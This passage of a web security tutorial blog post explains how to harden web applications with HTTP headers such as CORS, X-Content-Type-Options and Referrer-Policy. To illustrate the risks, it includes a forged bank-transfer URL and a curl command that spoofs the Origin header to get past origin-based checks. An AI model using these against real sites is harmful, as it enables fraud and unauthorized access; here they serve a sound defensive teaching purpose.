+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="nx">Feature</span><span class="o">-</span><span class="nx">Policy</span><span class="o">:</span> <span class="nx">vibrate</span> <span class="s1">&#39;self&#39;</span><span class="p">;</span> <span class="nx">push</span> <span class="o">*</span><span class="p">;</span> <span class="nx">camera</span> <span class="s1">&#39;none&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If we still have a few doubts about how this policy impacts the browser APIs available
+to the page, we can simply dissect it:</p>
+
+<ul>
+<li><code>vibrate 'self'</code>: this will allow the current page to use the vibration API and any nested browsing contexts (iframes) on the same origin</li>
+<li><code>push *</code>: the current page and any iframe can use the push notification API</li>
+<li><code>camera 'none'</code>: access to the camera API is denied to the current page and any nested context (iframes)</li>
+</ul>
+
+
+<p>The feature policy might have a short history, but it doesn&rsquo;t hurt to get a head
+start: if your website allows users to, for example, take a selfie or record audio,
+it would be quite beneficial to use a policy that restricts other contexts from
+accessing the API through your page.</p>
+
+<h2>X-Content-Type-Options</h2>
+
+<p>Sometimes, clever browser features end up hurting us from a security standpoint:
+a clear example is MIME-sniffing, a technique popularized by Internet Explorer.</p>
+
+<p>MIME-sniffing is the ability, for a browser, to auto-detect (and fix) the content type of
+a resource it is downloading: say that, for example, we ask the browser to render
+an image at <code>/awesome-picture.png</code>, but the server sets the wrong
+type when serving it to the browser (ie. <code>Content-Type: text/plain</code>) &mdash; this would
+generally result in the browser not being able to display the image properly.</p>
+
+<p>In order to fix the issue, IE went to great lengths to implement a MIME-sniffing
+capability: when downloading a resource, the browser would &ldquo;scan&rdquo; it and, if it
+would detect that the resource&rsquo;s content type is not the one advertised by the
+server in the <code>Content-Type</code> header, it would ignore the type sent by the server
+and interpret the resource according to the type detected by the browser.</p>
+
+<p>Now, imagine hosting a website that allows users to upload their own images, and
+imagine a user uploading a <code>/test.jpg</code> file that contains JavaScript code. See
+where this is going? Once the file is uploaded, the site would include it in its own
+HTML and, when the browser would try to render the document, it would find the &ldquo;image&rdquo; the user
+just uploaded. As the browser downloads the image, it would detect that it&rsquo;s a script
+instead, and execute it on the victim&rsquo;s browser.</p>
+
+<p>To avoid this issue, we can set the <code>X-Content-Type-Options: nosniff</code> header that
+completely disables MIME-sniffing: by doing so, we are telling the browser that
+we&rsquo;re fully aware that some file might have a mismatch in terms of type and content,
+and the browser should not worry about it &mdash; we know what we&rsquo;re doing, so the browser
+shouldn&rsquo;t try to guess things, potentially posing a security threat to our users.</p>
+
+<h2>CORS</h2>
+
+<p>On the browser, through JavaScript, HTTP requests can only be triggered across the
+same origin: simply put, an AJAX request from <code>example.com</code> can only connect to
+<code>example.com</code>.</p>
+
+<p>This is because your browser contains useful information for an attacker: cookies,
+which are generally used to keep track of the user&rsquo;s session. Imagine if an attacker
+would set up a malicious page at <code>win-a-hummer.com</code> that immediately triggers an
+AJAX request to <code>your-bank.com</code>: if you&rsquo;re logged in on the bank&rsquo;s website, the
+attacker would then be able to execute HTTP requests with your credentials, potentially
+stealing information or, worse, wiping your bank account out.</p>
+
+<p>There might be some cases, though, that require you to execute cross-origin AJAX
+requests, and that is the reason browsers implement Cross Origin Resource Sharing (abbr. CORS),
+a set of directives that allow you to execute cross-domain requests.</p>
+
+<p>The mechanics behind CORS are quite complex, and it won&rsquo;t be practical for us to
+go over the whole specification, so I am going to focus on a &ldquo;stripped down&rdquo; version
+of CORS: all you need to know, for now, is that by using the <code>Access-Control-Allow-Origin</code>
+header, your application tells the browser that it&rsquo;s ok to receive requests from
+other origins.</p>
+
+<p>The most relaxed form of this header is <code>Access-Control-Allow-Origin: *</code>, which
+allows any origin to access our application, but we can restrict it by simply
+adding the URL we want to whitelist with <code>Access-Control-Allow-Origin: https://example.com</code>.</p>
+
+<p>If we take a look at the example at <a href="https://github.com/odino/wasec/tree/master/cors">github.com/odino/wasec/tree/master/cors</a>
+we can clearly see how the browser prevents access to a resource on a separate origin:
+I have set up the example to make an AJAX request from <code>test-cors</code> to <code>test-cors-2</code>,
+and print the result of the operation to the browser. When the server behind <code>test-cors-2</code>
+is instructed to use CORS, the page works as you would expect &mdash; try navigating to
+<code>http://cors-test:7888/?cors=on</code>:</p>
+
+<p><img class="center" src="/images/wasec/cors-ok.png"></p>
+
+<p>But when we remove the <code>cors</code> parameter from the URL, the browser intervenes and
+prevents us from accessing the content of the response:</p>
+
+<p><img class="center" src="/images/wasec/cors-ko.png"></p>
+
+<p>An important aspect we need to understand is that the browser executed the request,
+but prevented the client from accessing it: this is extremely important, as it still
+leaves us vulnerable if our request would have triggered any side effect on the server
+&mdash; imagine, for example, if our bank would allow to transfer money by simply
+calling the url <code>my-bank.com/transfer?amount=1000&amp;from=me&amp;to=attacker</code>, that would
+be a disaster!</p>
+
+<p>As we&rsquo;ve seen at the beginning of this article, <code>GET</code> requests are supposed to be
+idempotent, but what would happen if we tried triggering a <code>POST</code> request? Luckily,
+I&rsquo;ve included this scenario in the example, so we can try it by navigating to
+<code>http://cors-test:7888/?method=POST</code>:</p>
+
+<p><img class="center" src="/images/wasec/cors-pre.png"></p>
+
+<p>Instead of directly executing our <code>POST</code> request, which could potentially cause
+some serious trouble on the server, the browser sent a &ldquo;preflight&rdquo; request:
+this is nothing but an <code>OPTIONS</code> request to the server, asking it to validate
+whether our origin is allowed. In this case, the server did not respond positively,
+so the browser stops the process, and our <code>POST</code> request never reaches the target.</p>
+
+<p>This tells us a couple things:</p>
+
+<ul>
+<li>CORS is not a simple specification: there are quite a few scenarios to keep
+in mind and you can easily get tangled in the nuances of features such as preflight requests</li>
+<li>never expose APIs that change state via <code>GET</code>: an attacker can trigger those requests
+without a preflight request, meaning there&rsquo;s no protection at all</li>
+</ul>
+
+
+<p>Out of experience, I found myself more comfortable with setting up proxies that
+can forward the request to the right server, all on the backend, rather than using CORS. This means that
+your application running at <code>example.com</code> can setup a proxy at <code>example.com/_proxy/other.com</code>,
+so that all requests falling under <code>_proxy/other.com/*</code> get proxied to <code>other.com</code>.</p>
+
+<p>I will conclude my overview of this feature here but, if you&rsquo;re interested in
+understanding CORS in depth, MDN has a very lengthy article
+that brilliantly covers the whole specification at <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a>.</p>
+
+<h2>X-Permitted-Cross-Domain-Policies</h2>
+
+<p>Very much related to CORS, the <code>X-Permitted-Cross-Domain-Policies</code> targets cross-domain
+policies for Adobe products (namely Flash and Acrobat).</p>
+
+<p>I won&rsquo;t go much into the details, as this is a header that targets very specific
+use cases: long story short, Adobe products handle cross-domain request through
+a <code>crossdomain.xml</code> file in the root of the domain the request is targeting, and
+the <code>X-Permitted-Cross-Domain-Policies</code> defines policies to access this file.</p>
+
+<p>Sounds complicated? I would simply suggest to add an
+<code>X-Permitted-Cross-Domain-Policies: none</code> and ignore clients wanting to make cross-domain
+requests with Flash.</p>
+
+<h2>Referrer-Policy</h2>
+
+<p>At the beginning of our careers, we all probably made the same mistake: use the <code>Referer</code>
+header to implement a security restriction on our website. If the header contains
+a specific URL in a whitelist we define, we&rsquo;re going to let users through.</p>
+
+<p>Ok, maybe that wasn&rsquo;t every one of us &mdash; but I damn sure made this mistake back then:
+trusting the <code>Referer</code> header to give us reliable information on the origin the user
+comes from. The header was really useful until we figured that sending
+this information to sites could pose a potential threat to our users&#8217; privacy.</p>
+
+<p>Born at the beginning of 2017 and currently supported by all major browsers, the
+<code>Referrer-Policy</code> header can be used to mitigate these privacy concerns by telling
+the browser that it should only mask the URL in the <code>Referer</code> header, or omit it
+altogether.</p>
+
+<p>Some of the most common values the <code>Referrer-Policy</code> can take are:</p>
+
+<ul>
+<li><code>no-referrer</code>: the <code>Referer</code> header will be entirely omitted</li>
+<li><code>origin</code>: turns <code>https://example.com/private-page</code> to <code>https://example.com/</code></li>
+<li><code>same-origin</code>: send the <code>Referer</code> to same-site origins but omit it for anyone else</li>
+</ul>
+
+
+<p>It&rsquo;s worth to note that there are a lot more variations of the <code>Referrer-Policy</code>
+(<code>strict-origin</code>, <code>no-referrer-when-downgrade</code>, etc) but the ones I mentioned above
+are probably going to cover most of your use cases. If you wish to better understand
+each and every variation you can use, I would recommend heading to the
+<a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#rp">OWASP dedicated page</a>.</p>
+
+<p>The <code>Origin</code> header is very similar to the <code>Referer</code>, as it&rsquo;s sent by the browser
+in cross-domain requests to make sure the caller is allowed to access a resource
+on a different domain. The <code>Origin</code> header is controlled by the browser, so there&rsquo;s no
+way malicious users can tamper with it. You might be tempted to use it as a
+firewall for your web application: if the <code>Origin</code> is in our whitelist,
+let the request go through.</p>
+
+<p>One thing to consider, though, is that other HTTP clients such as cURL can present
+their own origin: a simple <code>curl -H "Origin: example.com" api.example.com</code> will
+render all origin-based firewall rules inefficient&hellip;   &hellip;and that is why you
+cannot rely on the <code>Origin</code> (or the <code>Referer</code>, as we&rsquo;ve just seen) to build
+a firewall to keep malicious clients away.</p>
+
+<h2>Testing your security posture</h2>
+
+<p>I want to conclude this article with a reference to <a href="https://securityheaders.com">securityheaders.com</a>,
+an incredibly useful website that allows you to verify that your web application
+has the right security-related headers in place &mdash; after you submit a URL, you
+will be handed a grade and a breakdown, header by header. Here&rsquo;s an <a href="https://securityheaders.com/?q=https%3A%2F%2Ffacebook.com&amp;followRedirects=on">example report
+for facebook.com</a>:</p>
+
+<p><img class="center" src="/images/wasec/security-headers.png"></p>
+
+<p>If in doubt on where to start, securityheaders.com is a great place to get a first
+assessment.</p>
+
+<h2>Stateful <a href="HTTP:">HTTP:</a> managing sessions with cookies</h2>
+
+<p>This article should have introduced us to a few interesting HTTP headers,
+allowing us to understand how they harden our web
+applications through protocol-specific features, together with a bit of help
+from mainstream browsers.</p>
+
+<p>In the next post, we will delve deep into one of the most misunderstood features
+of the HTTP protocol: cookies.</p>
+
+<p>Born to bring some sort of state to the otherwise stateless HTTP, cookies have
+probably been used (and misused) by each and everyone of us in order to support
+sessions in our web apps: whenever there&rsquo;s some state we&rsquo;d like to persist it&rsquo;s
+always easy to say &ldquo;store it in a cookie&rdquo;. As we will see, cookies are not always
+the safest of vaults and must be treated carefully when dealing with sensitive
+information.</p>
+
+<div class="series_nav">
+  
+  <div class="prev">
+    <a href="/security-https-perspective/">Security at the HTTP level</a>
+  </div>
+  
+  
+  <div class="next">
+    <a href="/security-hardening-http-cookies/">Hardening HTTP cookies</a>
+  </div>
+  
+</div>
+
+</div>
+
+
+
+<div class="recent entry-content">
+  <hr class="divider-cazzuto">
+  <h3>
+    In the mood for some more reading?
+  </h3>
+  <ul>
+    
+      <li><a href="/fwupd-is-the-best-thing-that-ever-happened-to-linux/">fwupd is the best thing that ever happened to Linux</a> (15 April 2021)</li>
+    
+      <li><a href="/avoid-battery-draining-on-your-linux-flavored-dell-xps/">Avoid battery draining on your Linux-flavored Dell XPS</a> (31 January 2021)</li>
+    
+      <li><a href="/combining-two-numbers-into-a-unique-one-pairing-functions/">Combining two numbers into a unique one: pairing functions</a> (05 December 2020)</li>
+    
+      <li><a href="/running-ci-tests-in-kubernetes-through-github-actions/">Running CI tests in Kubernetes through Github Actions</a> (20 March 2020)</li>
+    
+      <li><a href="/ive-decided-to-make-the-wasec-ebook-free-during-these-trying-times/">I've decided to make the WASEC ebook free during these trying times</a> (20 March 2020)</li>
+    
+      <li><a href="/local-k8s-development-in-2020/">Local k8s development in 2020</a> (31 December 2019)</li>
+    
+      <li><a href="/wasec-a-book-about-web-application-security-is-now-available-for-sale/">WASEC, a book about Web Application Security, is now available for sale</a> (25 November 2019)</li>
+    
+  </ul>
+    <p>
+      ...or <a href="/archives/">check the archives</a>.
+    </p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/anchor-js/3.2.0/anchor.min.js"></script>
+<script type="text/javascript" />
+(function () {
+  'use strict';
+
+  anchors.options = {
+    placement: 'left',
+    visible: 'hover',
+    icon: '¶'
+  };
+
+  anchors.add('h2');
+  anchors.add('h3');
+  anchors.add('h4');
+
+})();
+</script>
+
+			<footer>
+				<center>
+	Copyleft <!--[if lte IE 8]><span style="filter: FlipH; -ms-filter: "FlipH"; display: inline-block;"><![endif]--><span style="-moz-transform: scaleX(-1); -o-transform: scaleX(-1); -webkit-transform: scaleX(-1); transform: scaleX(-1); display: inline-block;">©</span><!--[if lte IE 8]></span><![endif]--> 2021 — Alessandro Nadalin
+	<address>
+	</address>
+</center>
+			</footer>
+		</div>
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-7407627-3', 'auto');
+      ga('send', 'pageview');
+	</script>
+	
+	<script type="application/ld+json">
+		{
+		"@context": "https://schema.org/",
+		"@type": "BlogPosting",
+		"mainEntityOfPage": {
+			"@type": "WebPage",
+			"@id": "https://odino.org/secure-your-web-application-with-these-http-headers/"
+		},
+		"headline": "Secure your web application with these HTTP headers",
+		"description": "We can improve the security of our web apps by using a few, underestimated headers: let's check them out!",
+		
+		"author": {
+			"@type": "Person",
+			"name": "Alessandro Nadalin"
+		},
+		"datePublished": "2018-08-23 12:52:00 +0000"
+		}
+	</script>
+	
+	</body>
+</html>
+<!-- END _layouts/default.html -->
